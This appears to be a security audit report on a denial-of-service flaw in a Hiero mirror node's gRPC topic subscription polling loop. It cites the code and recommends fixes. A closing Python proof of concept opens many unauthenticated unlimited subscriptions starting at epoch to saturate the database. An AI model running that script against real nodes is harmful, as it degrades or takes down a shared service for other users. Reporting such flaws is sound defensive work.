### Title
Unbounded Polling Loop Causes Sustained Maximum DB Load via Historical Backlog Subscription

### Summary
`PollingTopicListener.poll()` has no mechanism to detect or throttle a subscription that perpetually returns full pages. An unprivileged user can subscribe with `startTime` set to a distant past timestamp on any topic with a large historical message backlog, causing the polling loop to execute `Long.MAX_VALUE` iterations at `maxPageSize` DB rows per poll with no rate limiting, no catch-up detection, and no subscription duration cap. Multiple connections multiply the effect.

### Finding Description

**Exact code path:**

`PollingTopicListener.java`, `poll()`, lines 51–62:

```java
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getCount().get())
        : Integer.MAX_VALUE;                          // no-limit subscription → Integer.MAX_VALUE
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize()); // always 5000
long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

`listen()`, lines 38–43:

```java
return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)   // effectively infinite
                .withFixedDelay(interval)              // 500 ms between polls
                ...
```

**Root cause — three failed assumptions:**

1. `TopicMessageFilter.isValidStartTime()` (line 50) only enforces `startTime <= now()`. There is no lower bound. A user may supply `startTime = 0` (epoch), causing the first poll to begin at the very first message ever recorded for that topic.
2. When `limit = 0` (no limit), `hasLimit()` returns `false` and `pageSize` is always `maxPageSize` (5000). There is no server-side enforcement of a maximum subscription duration or a maximum total messages delivered.
3. The polling loop has no "full-page sentinel": it never checks whether the returned page was full (i.e., whether the subscriber is lagging behind). It simply re-polls after `interval` regardless.

**Exploit flow:**

- Attacker opens a gRPC connection and calls `subscribeToTopic` with `startTime = 0`, `limit = 0` (unlimited), targeting any topic with a large historical backlog (e.g., a topic with 500 million messages).
- Each `poll()` call issues `SELECT … LIMIT 5000` against the DB, fetches 5000 rows, advances `startTime` by 5000 messages, and schedules the next poll in 500 ms.
- 500 million messages / 5000 per poll × 500 ms = ~27 hours of continuous maximum-page DB queries from a single subscription.
- `NettyProperties.maxConcurrentCallsPerConnection = 5` limits calls per TCP connection, but the attacker opens multiple TCP connections. Each connection contributes 5 simultaneous subscriptions. With 10 connections: 50 parallel polling loops, each issuing a 5000-row query every 500 ms = 500,000 DB rows fetched per second.
- No authentication is required to open a gRPC subscription.

**Why existing checks are insufficient:**

- `maxConcurrentCallsPerConnection = 5` limits per-connection concurrency but does not limit total connections or total subscriptions server-wide.
- `isValidStartTime()` only checks `startTime <= now()`, not a minimum age.
- There is no per-IP, per-topic, or global subscription count limit in `PollingTopicListener` or `GrpcConfiguration`.
- There is no `endTime` enforcement or maximum subscription lifetime.
- The `RepeatSpec.times(Long.MAX_VALUE)` loop has no early-exit condition based on lag or page fullness.

### Impact Explanation

Sustained maximum-rate DB queries degrade query latency for all other mirror node users (REST API, other gRPC subscribers). With enough parallel subscriptions, the DB connection pool is saturated, causing timeouts and service unavailability. The attacker pays no on-chain cost — subscribing to the mirror node gRPC API is free and unauthenticated. This is a denial-of-service against the mirror node's database tier.

### Likelihood Explanation

Any unprivileged user with network access to the gRPC port (5600) can execute this. Historical message counts for all topics are publicly visible via the REST API, so an attacker can trivially identify high-backlog topics. No special tooling is required beyond a standard gRPC client. The attack is repeatable and can be automated.

### Recommendation

1. **Enforce a minimum `startTime` age** in `TopicMessageFilter.isValidStartTime()` (e.g., reject subscriptions starting more than N days in the past, or require `endTime` to be set for historical queries).
2. **Add a full-page backoff**: in `poll()`, if the returned page size equals `maxPageSize`, introduce an exponential backoff or a configurable maximum catch-up rate to prevent sustained full-speed polling.
3. **Add a global/per-IP subscription limit** in `GrpcConfiguration` or a gRPC interceptor, independent of `maxConcurrentCallsPerConnection`.
4. **Enforce a maximum subscription duration** (configurable `maxSubscriptionDuration`) after which the server terminates the stream with a retriable status.
5. **Rate-limit new subscription establishment** per source IP.

### Proof of Concept

```python
import grpc
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, mirror_network_service_pb2
from google.protobuf.timestamp_pb2 import Timestamp

# Open multiple connections to amplify
channels = [grpc.insecure_channel("mirror-node:5600") for _ in range(10)]

for ch in channels:
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(ch)
    req = mirror_network_service_pb2.ConsensusTopicQuery()
    req.topicID.topicNum = TARGET_TOPIC_WITH_LARGE_BACKLOG
    req.consensusStartTime.CopyFrom(Timestamp(seconds=0, nanos=0))  # epoch
    # limit = 0 (not set) → unlimited
    # Open 5 concurrent streams per connection
    for _ in range(5):
        stub.subscribeTopic(req)  # fire and forget, each drives a poll() loop

# Result: 50 parallel polling loops, each issuing SELECT … LIMIT 5000 every 500ms
# = 500,000 DB rows fetched/sec sustained for hours
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L38-43)
```java
        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L51-62)
```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L39-41)
```java
    public boolean hasLimit() {
        return limit > 0;
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L48-51)
```java
    @AssertTrue(message = "Start time must be before the current time")
    public boolean isValidStartTime() {
        return startTime <= DomainUtils.now();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/ListenerProperties.java (L26-30)
```java
    private int maxPageSize = 5000;

    @DurationMin(millis = 50)
    @NotNull
    private Duration interval = Duration.ofMillis(500L);
```
